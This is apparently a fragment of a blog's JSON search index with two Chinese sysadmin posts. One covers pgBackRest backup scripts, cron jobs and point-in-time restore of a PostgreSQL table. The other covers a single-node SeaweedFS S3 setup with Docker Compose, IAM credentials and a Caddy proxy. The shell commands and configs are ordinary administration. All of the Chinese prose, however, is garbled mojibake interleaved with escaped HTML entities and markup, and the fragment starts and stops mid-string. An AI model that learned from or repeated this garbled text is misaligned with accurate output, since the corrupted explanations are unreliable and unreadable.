Successfully\u0026#34; \u0026gt;\u0026gt; ${LOG_FILE} else echo \u0026#34;$(date \u0026#39;+%Y-%m-%d %H:%M:%S\u0026#39;) - Full Backup Failed\u0026#34; \u0026gt;\u0026gt; ${LOG_FILE} fi å¢é‡å¤‡ä»½çš„è„šæœ¬incr.sh\n#!/bin/bash # è®¾ç½® pgBackRest ç›¸å…³å‚æ•° PG_BACKREST_COMMAND=\u0026#34;/usr/bin/pgbackrest\u0026#34; STANZA=\u0026#34;main\u0026#34; LOG_FILE=\u0026#34;/var/log/pgbackrest_incr_backup.log\u0026#34; # æ‰§è¡Œå¢é‡å¤‡ä»½ sudo -u postgres ${PG_BACKREST_COMMAND} --stanza=${STANZA} --log-level-console=info backup --type=incr \u0026gt;\u0026gt; ${LOG_FILE} 2\u0026gt;\u0026amp;1 # æ£€æµ‹å¤‡ä»½æ˜¯å¦æˆåŠŸ if [ $? -eq 0 ]; then echo \u0026#34;$(date \u0026#39;+%Y-%m-%d %H:%M:%S\u0026#39;) - Incremental Backup Completed Successfully\u0026#34; \u0026gt;\u0026gt; ${LOG_FILE} else echo \u0026#34;$(date \u0026#39;+%Y-%m-%d %H:%M:%S\u0026#39;) - Incremental Backup Failed\u0026#34; \u0026gt;\u0026gt; ${LOG_FILE} fi ç¼–è¾‘crontab\n# æ¯å‘¨æ—¥å‡Œæ™¨2ç‚¹æ‰§è¡Œå®Œæ•´å¤‡ä»½ (full.sh) 0 2 * * 0 /path/to/full.sh # ä»å‘¨ä¸€åˆ°å‘¨å…­å‡Œæ™¨2ç‚¹æ‰§è¡Œå¢é‡å¤‡ä»½ (incr.sh) 0 2 * * 1-6 /path/to/incr.sh äº”ã€æ–°å®ä¾‹postgreså®‰è£… # è¿™æ˜¯å°æ–°çš„debian 12ç³»ç»Ÿ, è¦è£… postgresql 13 apt update apt upgrade apt install -y curl gpg curl -fsSL https://www.postgresql.org/media/keys/ACCC4CF8.asc | gpg --dearmor -o /etc/apt/trusted.gpg.d/postgresql.gpg echo \u0026#34;deb http://apt.postgresql.org/pub/repos/apt/ $(lsb_release -cs)-pgdg main\u0026#34; | tee /etc/apt/sources.list.d/pgdg.list apt update apt-get install postgresql-13 å¦‚ä¸Šå°±æ–°è£…äº†ä¸€ä¸ªposgres 13\nå…­ã€æ–°å®ä¾‹å®‰è£…pgbackrest systemctl stop postgresql apt install pgbackrest vi /etc/pgbackrest.conf [main] pg1-path=/var/lib/postgresql/13/main pg1-port=5432 [global] repo1-path=/var/lib/pgbackrest log-level-console=info log-level-file=info sudo systemctl start postgresq å…­ã€å‡†å¤‡æ¢å¤ç¯å¢ƒçš„æ•°æ® è¦æŠŠæ•°pgbackrestçš„æ•°æ®åŒæ­¥åˆ°æ–°å®ä¾‹ä¸Šï¼š # ä½¿ç”¨ rsyncï¼ˆæ¨èï¼‰ sudo rsync -avz /var/lib/pgbackrest/ \u0026lt;new_instance_user\u0026gt;@\u0026lt;new_instance_ip\u0026gt;:/var/lib/pgbackrest/ # æˆ–è€…ï¼Œä½¿ç”¨ scp sudo scp -r /var/lib/pgbackrest/ \u0026lt;new_instance_user\u0026gt;@\u0026lt;new_instance_ip\u0026gt;:/var/lib/pgbackrest/ # è®¾ç½®æ­£ç¡®æƒé™ chown -R postgres:postgres /var/lib/pgbackrest chmod 750 /var/lib/pgbackrest ä¸ƒã€æ–°å®ä¾‹ä¸Šæ‰§è¡Œæ¢å¤åˆ°æ—¶é—´ç‚¹ sudo -u postgres pgbackrest --stanza=main \\ --target=\u0026#34;2025-09-15 14:00:00\u0026#34; \\ --target-action=promote \\ --delta restore --log-level-console=info å‚æ•°è¯´æ˜ï¼š --stanza=mainï¼šæŒ‡å®šå¤‡ä»½é…ç½®çš„åç§°ã€‚ --targetï¼šè®¾ç½®æ—¶é—´ç‚¹ã€‚ --target-action=promoteï¼šè®©æ¢å¤å®Œæˆåå®ä¾‹æˆä¸ºä¸»å®ä¾‹ã€‚ --deltaï¼šåªæ¢å¤æœ‰å˜æ›´çš„æ•°æ®ï¼ˆæé«˜æ¢å¤é€Ÿåº¦ï¼‰ã€‚ systemctl start postgresql å…«ã€æŠŠæ–°å®ä¾‹ä¸Šçš„æ•°æ®dumpå‡ºæ¥ # ä½¿ç”¨ psql ä»æ¢å¤çš„æ•°æ®åº“å¯¼å‡ºç›®æ ‡è¡¨æ•°æ®ã€‚å‡è®¾ä½ è¦æ¢å¤çš„è¡¨åæ˜¯ public.my_tableï¼Œä½ å¯ä»¥å¯¼å‡ºå®ƒçš„æ•°æ®ä¸º SQL è„šæœ¬ï¼š pg_dump -U postgres -t public.my_table my_database \u0026gt; my_table_data.sql # æˆ–è€…é€‰æ‹©ä»…å¯¼å‡ºæŸäº›è¡Œæ•°æ®ï¼ˆæ¯”å¦‚æŒ‰æ—¶é—´æ¡ä»¶ç­›é€‰ï¼‰åˆ° SQL è„šæœ¬ä¸­ï¼š psql -U postgres -d my_database -c \u0026#34;\\copy (SELECT * FROM public.my_table WHERE created_at BETWEEN \u0026#39;2023-09-30\u0026#39; AND \u0026#39;2023-10-01\u0026#39;) TO \u0026#39;/tmp/my_table_data.csv\u0026#39; WITH CSV HEADER\u0026#34; ç„¶åå»æ—§å®ä¾‹ä¸Šï¼ŒçŒå…¥æ•°æ®\n# å»ºåŒæ ·çš„è¡¨ CREATE TABLE public.my_table_recovery (LIKE public.my_table INCLUDING ALL); # ä¿®æ”¹è¯­å¥ sed -i \u0026#39;s/old_table/new_table/g\u0026#39; my_table_data.sql # å¯¼sql psql -U postgres -d my_database -f my_table_data.sql # å¯¼æ•°æ® # åŒæ ·è¦ä¿®æ”¹CSVçš„ï¼ï¼ï¼ \\copy public.my_table_recovery FROM \u0026#39;/tmp/my_table_data.csv\u0026#39; WITH CSV HEADER è¿™æ ·å°±okäº†ã€‚\n","permalink":"https://rendoumi.com/posts/20250915-pgbackrest_restore/","summary":"\u003cp\u003eæœ€è¿‘ç‹ æŠ˜è…¾äº†ä¸€é€špostgresçš„å¤‡ä»½ï¼Œè·ŸMySQLçš„é˜¿é‡ŒRDBæ¢å¤ä¸€æ ·ï¼Œå¦‚ä½•ä¸åœæ­¢æ•°æ®åº“æœåŠ¡ï¼Œæ¢å¤æŸä¸ªè¡¨çš„æ•°æ®åˆ°æŸä¸ªæ—¶é—´ç‚¹ï¼Œç„¶åæ”¾åˆ°å¦ä¸€ä¸ªè¡¨ä¸­å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eå…¶å®ç”¨ä¹‹å‰çš„walæ¢å¤ä¸€æ ·çš„ï¼Œå°±æ˜¯è¦æŠŠå½“å¤©å®ä¾‹çš„å…¨å¤‡ä»½å’Œwaléƒ½å¤åˆ¶åˆ°å¦å¤–ä¸€å°ä¸Šï¼Œç„¶åæ¢å¤ï¼Œå†æŠŠæ•°æ®ç»™dumpä¸‹æ¥ï¼Œå†å»ºä¸€ä¸ªæ–°è¡¨ï¼ŒæŠŠæ•°æ®å¯¼å›å»ã€‚\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"/posts/20250728-postgres_wal_pitr/\"\u003ePostgresçš„walå’ŒPITRæ—¶é—´ç‚¹æ¢å¤\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eç”¨pgbackrestæ„Ÿè§‰ä¼šå¥½ä¸€äº›ï¼Œå…¶å®éƒ½å·®ä¸å¤šï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch5 id=\"ä¸€å®‰è£…å¹¶é…ç½®pgbackrest\"\u003eä¸€ã€å®‰è£…å¹¶é…ç½®pgbackrest\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install pgbackrest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å»ºç«‹å¤‡ä»½çš„å¤§æœ¬è¥\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /var/lib/pgbackrest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e750\u003c/span\u003e /var/lib/pgbackrest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echown postgres:postgres /var/lib/pgbackrest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç¼–è¾‘ /etc/pgbackrest.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eglobal\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erepo1-path\u003cspan class=\"o\"\u003e=\u003c/span\u003e/var/lib/pgbackrest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erepo1-retention-full\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e26\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erepo1-retention-archive\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e180\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog-level-file\u003cspan class=\"o\"\u003e=\u003c/span\u003einfo\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog-level-console\u003cspan class=\"o\"\u003e=\u003c/span\u003einfo\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eglobal:archive-push\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecompress-level\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003emain\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epg1-path\u003cspan class=\"o\"\u003e=\u003c/span\u003e/var/lib/postgresql/13/main\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epg1-port\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e5432\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè®²è§£ä¸€ä¸‹å‚æ•°\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eglobalé‡Œé¢æ˜¯å…¨å±€é…ç½®\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erepo1-path\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e/var/lib/pgbackrest   # pgBackRest å­˜å‚¨åº“è·¯å¾„\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erepo1-retention-full\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e26          # ä¿ç•™æœ€è¿‘çš„ 26 ä¸ªå…¨é‡å¤‡ä»½ï¼Œå¤§æ¦‚6ä¸ªæœˆï¼Œ180å¤©\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erepo1-retention-archive\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e180      # ä¿ç•™æœ€è¿‘ 180 å¤©çš„ WAL æ—¥å¿—\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elog-level-file\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003einfo              # æ–‡ä»¶æ—¥å¿—çº§åˆ«\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elog-level-console\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003einfo           # æ§åˆ¶å°æ—¥å¿—çº§åˆ«\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eglobal:archive-push è®¾ç½®çš„æ˜¯walå½’æ¡£çš„ä¿å­˜æ–¹å¼æ˜¯å‹ç¼©ä¿å­˜\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003emainéƒ¨åˆ†è®¾ç½®çš„æ˜¯è¦å¤‡ä»½çš„postgresæºçš„è·¯å¾„å’Œç«¯å£ï¼Œã€mainã€‘æ˜¯stanzaçš„åå­—\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eä¸Šé¢çš„å¤‡ä»½å…¶å®æœ‰ä¸‰ç§å¤‡ä»½ï¼Œfullå’Œincrå’Œwalå¤‡ä»½ï¼Œé‚£å¦‚æœfullå’Œå¢é‡éƒ½æ²¡äº†ï¼Œåªè¦walè¿˜åœ¨ï¼Œé‚£ä¹ˆä¾ç„¶èƒ½æ¢å¤åˆ°180å¤©ä¹‹å†…çš„æŸä¸ªæ—¶é—´ç‚¹ã€‚walå¾ˆå ç©ºé—´ï¼Œfullä¹Ÿå¾ˆå ç©ºé—´ï¼Œä¸€å®šè¦ç®—å‡†äº†ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£å…¶å®pgbackrestæ˜¯ç”¨postgresèº«ä»½å»æ‰§è¡Œå‘½ä»¤çš„ï¼Œæ‰€ä»¥ä¸ç”¨è®¤è¯èº«ä»½ã€‚\u003c/p\u003e\n\u003ch5 id=\"äºŒé…ç½®postgres\"\u003eäºŒã€é…ç½®postgres\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/postgresql/13/main/postgresql.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# walå½’æ¡£æ–¹æ³•ï¼š\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#archive_mode = on\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#archive_command = \u0026#39;cp %p /data/backup/%f\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# pgbackrestå½’æ¡£æ–¹æ³•ï¼š\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003earchive_mode\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e on                  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003earchive_command\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;pgbackrest --stanza=main archive-push %p\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ewal_level\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e replica   \u003cspan class=\"c1\"\u003e#å¤‡ä»½çº§åˆ«æ˜¯å‰¯æœ¬\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emax_wal_senders\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e3\u003c/span\u003e   \u003cspan class=\"c1\"\u003e#æœ€å¤šwalæ—¥å¿—å‘åˆ°3ä¸ªå®¢æˆ·ç«¯å»\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# éœ€è¦é‡å¯postgres\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl restart postgresql\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"ä¸‰æµ‹è¯•pgbackrestçš„å¤‡ä»½åŠŸèƒ½\"\u003eä¸‰ã€æµ‹è¯•pgbackrestçš„å¤‡ä»½åŠŸèƒ½\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# å»ºç«‹ä¸€ä¸ªstanza\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  sudo -u postgres pgbackrest --stanza\u003cspan class=\"o\"\u003e=\u003c/span\u003emain --log-level-console\u003cspan class=\"o\"\u003e=\u003c/span\u003einfo stanza-create\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# æ£€æŸ¥\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  sudo -u postgres pgbackrest --stanza\u003cspan class=\"o\"\u003e=\u003c/span\u003emain --log-level-console\u003cspan class=\"o\"\u003e=\u003c/span\u003einfo check\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# æŸ¥çœ‹ä¿¡æ¯\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  sudo -u postgres pgbackrest info\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20250915200557932\" loading=\"lazy\" src=\"/posts/20250915-pgbackrest_restore/image-20250915200557932.png\"\u003e\u003c/p\u003e","title":"Postgres pgbackrestå¤‡ä»½ä»¥åŠæŒ‡å®šæ—¶é—´ç‚¹æ¢å¤"},{"content":"å…¬å¸è¦åšç³»ç»Ÿè¿ç§»ï¼Œä»AWSè¿ç§»åˆ°è‡ªå»ºæœºæˆ¿ï¼Œé‚£è¿ç§»çš„é¡¹ç›®å°±ä¸€å¤§å †ï¼ŒS3ä¹Ÿåœ¨å…¶ä¸­ä¹‹åˆ—ã€‚\næ‰¾æ¥æ‰¾å»ï¼Œç¬¬ä¸€é¦–é€‰çš„æ›¿ä»£è½¯ä»¶æ˜¯minioï¼Œå¯æ˜¯ä¸‡æ¶çš„minioå›¢é˜Ÿåœ¨è¿™ä¸ªæ—¶é—´ç‚¹ï¼Œå·²ç»åå°ç§»é™¤äº† admin ç›¸å…³çš„æ“ä½œæƒé™\nè¦æƒ³ç”¨å‘¢ï¼Œåªèƒ½ç”¨ä¸ªè€ç‰ˆæœ¬çš„ï¼šquay.io/minio/minio:RELEASE.2025-04-22T22-12-26Z\né‚£åªèƒ½å†æ‰¾äº†ï¼Œäºæ˜¯æ‰¾åˆ°äº†SeaweedFSï¼Œè¿™ä¸ªè½¯ä»¶å…¶å®æ˜¯ä¸ªå½»å¤´å½»å°¾çš„å•æ–‡ä»¶ï¼Œä½†æ˜¯åˆ†å¸ƒå¼å…¨é›†ç¾¤æ¶æ„\nç®€å•çš„è¯´ï¼Œå°±æ˜¯ä¸€ä¸ªè½¯ä»¶ï¼ŒåŒ…å«äº†10å‡ ç§åŠŸèƒ½ã€‚\nè€Œæˆ‘ä»¬å‘¢ï¼Œå…¶å®å°±è¦å®ƒçš„ä¸€ä¸ªåŠŸèƒ½s3ï¼Œè€Œä¸”è¦ç”¨äºç”Ÿäº§ã€‚ç½‘ä¸Šä¸€å¤§å †çš„æ•™ç¨‹éƒ½æ˜¯å„ç§åˆ†å¸ƒå¼çš„éƒ¨ç½²ï¼Œå¦‚æœæœºå™¨è¶³å¤Ÿï¼Œå¤§å®¶å¯ä»¥å‚è€ƒç½‘ä¸Šæ•™ç¨‹ã€‚\næˆ‘ä»¬å•å°æœºå™¨ï¼Œç¡¬ç›˜åº•å±‚æ˜¯raid10ï¼Œç„¶åä¸Šå±‚å°±åªæä¾›s3ï¼Œè€Œä¸”è¦é…ç½®ç®€å•ï¼Œæ²¡æœ‰ä»€ä¹ˆå®‰å…¨é—®é¢˜ï¼Œè¿™å°æœºå™¨æ˜¯ç›´æ¥æš´éœ²å…¬ç½‘IPçš„ã€‚\né‚£æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯Docker composeï¼Œè€Œä¸”åªæ”¾å¼€s3çš„æŒ‡å®šç«¯å£ï¼š\nservices: seaweedfs-s3: image: chrislusf/seaweedfs container_name: seaweedfs-s3 volumes: - ./data:/data - ./config/config.json:/seaweedfs/config.json ports: - \u0026#34;127.0.0.1:8333:8333\u0026#34; # - \u0026#34;9333:9333\u0026#34; entrypoint: /bin/sh -c command: | \u0026#34;echo \u0026#39;Starting SeaweedFS S3 server\u0026#39; \u0026amp;\u0026amp; \\ weed server -dir=/data -volume.max=120 -s3 -s3.config /seaweedfs/config.json\u0026#34; restart: unless-stopped ä»”ç»†è§£é‡Šä¸Šé¢çš„å‚æ•°ï¼š\nports åªå¼€äº† 127.0.0.1:8333 çš„S3ç«¯å£ï¼Œå…¶å®ƒéƒ½ä¸å¼€ï¼Œå¦‚æœéœ€è¦æŸ¥çœ‹æœåŠ¡çŠ¶æ€ï¼Œå¯ä»¥ä¸´æ—¶æ‰“å¼€9333ç«¯å£æŸ¥çœ‹ï¼Œçœ‹å®Œå†å…³ -volume.max=120ï¼Œè¿™ä¸ªåŠ¡å¿…è¦æ³¨æ„ï¼Œseaweedæ˜¯åˆ†å·çš„ï¼Œä¸€ä¸ªå·æœ€å¤š30Gï¼Œç¼ºçœæ˜¯8ä¸ªå·ã€‚é‚£ç¼ºçœå°±æ˜¯åªæœ‰240Gçš„å®¹é‡ï¼Œæˆ‘ä»¬çš„ç¡¬ç›˜æ˜¯4Tçš„ï¼Œå‰©ä½™3.7TBï¼Œé‚£ç®—ä¸‹æ¥ï¼Œ30*120=3600G=3.6Tã€‚è¿™æ ·å°±å¯¹å‡†äº†ï¼Œè¿™ä¸ªå‚æ•°ä¸€å®šè¦æ ¹æ®ç”Ÿäº§çš„å®é™…æƒ…å†µè¿›è¡Œè°ƒæ•´. å¦å¤–è¿˜æŠŠconfig.jsonçš„é…ç½®æ–‡ä»¶ç»™mountå…¥dockerå·ä¸­äº†ï¼Œé…ç½®æ–‡ä»¶é‡Œæ”¾çš„å°±æ˜¯S3çš„IAMè®¿é—®æƒé™æ§åˆ¶ è¯¦ç»†çœ‹ä¸€ä¸‹config.json\n{ \u0026#34;identities\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;credentials\u0026#34;: [ { \u0026#34;accessKey\u0026#34;: \u0026#34;aaa\u0026#34;, \u0026#34;secretKey\u0026#34;: \u0026#34;bbb\u0026#34; } ], \u0026#34;actions\u0026#34;: [ \u0026#34;Admin\u0026#34;, \u0026#34;Read\u0026#34;, \u0026#34;List\u0026#34;, \u0026#34;Tagging\u0026#34;, \u0026#34;Write\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;goods\u0026#34;, \u0026#34;credentials\u0026#34;: [ { \u0026#34;accessKey\u0026#34;: \u0026#34;ccc\u0026#34;, \u0026#34;secretKey\u0026#34;: \u0026#34;ddd\u0026#34; } ], \u0026#34;actions\u0026#34;: [ \u0026#34;Read:goods\u0026#34;, \u0026#34;Write:goods\u0026#34;, \u0026#34;List:goods\u0026#34;, \u0026#34;Tagging:goods\u0026#34;, \u0026#34;Admin:goods\u0026#34; ] } ] } è§£é‡Šä¸€ä¸‹ï¼Œä¸Šé¢å®šä¹‰äº†ä¸€ä¸ªadminç”¨æˆ·ï¼Œå¯ä»¥å¯¹æ‰€æœ‰s3è¿›è¡Œè¯»å†™å’Œç®¡ç†ã€‚\nç„¶ååˆå®šä¹‰äº†ä¸€ä¸ªgoodsç”¨æˆ·ï¼Œå®ƒåªå¯¹goodsæ¡¶æœ‰æƒé™ã€‚\né‚£seaweedçš„æ¡¶å’Œæƒé™å®é™…æ˜¯åˆ†å¼€çš„ï¼Œç®¡ç†çš„æ—¶å€™å¯ä»¥å…ˆå»ºæ¡¶ï¼Œç„¶ååœ¨é…ç½®æ–‡ä»¶é‡Œå†é…ç½®æƒé™ï¼Œæœ€åé‡è½½docker compose up -då³å¯\nå¤§å®¶è‚¯å®šä¹Ÿæ³¨æ„åˆ°äº†ï¼Œç«¯å£æ˜ å°„åªå¼€äº†127.0.0.1:8333ï¼Œè¿™æ˜¯å› ä¸ºhttpç«¯å£ï¼Œå‰é¢éœ€è¦å¥—ä¸ªhttpsæ‰èƒ½æ”¾åˆ°ç”Ÿäº§ç¯å¢ƒã€‚\né‚£å‰ç½®ä»£ç†httpsï¼Œå°±å¥—ç”¨Caddyå¥½äº†ï¼Œé…ç½®æ–‡ä»¶Caddyfileä¹Ÿå·¨ç®€å•, å°±ä¸‰è¡Œï¼š\ns3.rendoumi.com { reverse_proxy 127.0.0.1:8333 } é‚£æˆ‘ä»¬ç®¡ç†çš„æ—¶å€™å°±ç”¨minioçš„å®¢æˆ·ç«¯mcå³å¯\nmc alias set mys3 https://s3.rendoumi.com aaa bbb mc ls mys3/goods mc mb newgoods mys3 mc ls mys3/newgoods æœ€åï¼Œå¦‚æœè¦ä»S3åŒæ­¥æ–‡ä»¶ï¼Œé‚£å°±ç”¨ JuiceFS çš„ juicesync è¿™ä¸ªè½¯ä»¶å³å¯ã€‚\n","permalink":"https://rendoumi.com/posts/20250915-seeweed_single_deploy/","summary":"\u003cp\u003eå…¬å¸è¦åšç³»ç»Ÿè¿ç§»ï¼Œä»AWSè¿ç§»åˆ°è‡ªå»ºæœºæˆ¿ï¼Œé‚£è¿ç§»çš„é¡¹ç›®å°±ä¸€å¤§å 